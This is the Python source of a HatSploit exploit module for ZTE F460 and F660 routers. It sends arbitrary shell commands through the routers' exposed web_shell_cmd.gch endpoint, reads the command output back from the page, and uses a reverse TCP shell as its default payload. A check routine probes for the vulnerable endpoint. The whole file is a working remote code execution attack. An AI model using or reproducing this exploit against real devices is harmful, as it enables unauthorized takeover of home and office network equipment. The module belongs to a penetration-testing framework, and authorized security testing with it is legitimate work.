"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP

from pex.string import String


class HatSploitModule(Module, Handler, String, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "ZTE F460 & F660 Remote Code Execution",
            'Module': "exploit/linux/zte/f460_f660_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Rapid7 - vulnerability researcher',
            ],
            'Description': "Remote Code Execution in ZTE F460 and F660.",
            'Platform': "linux",
            'Rank': "high",
            'Payload': {
                'Value': "linux/mipsle/shell_reverse_tcp",
                'Arches': ['mipsle', 'mipsbe', 'generic'],
                'Platforms': ['linux', 'unix'],
            }
        })

    def exploit(self, command):
        data = {
            "IF_ACTION": 'apply',
            "IF_ERRORSTR": 'SUCC',
            "IF_ERRORPARAM": 'SUCC',
            "IF_ERRORTYPE": '-1',
            "Cmd": command,
            "CmdAck": '',
        }

        response = self.http_request(
            method="POST",
            path='/web_shell_cmd.gch',
            data=data,
        )

        regexp = '<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>'
        output = re.findall(regexp, response.text, re.DOTALL)

        if len(output):
            return output[0]

    def check(self):
        response = self.http_request(
            method="GET",
            path="/web_shell_cmd.gch"
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            method="echo",
            concat="&&",
            linemax=15,
            sender=self.exploit,
        )
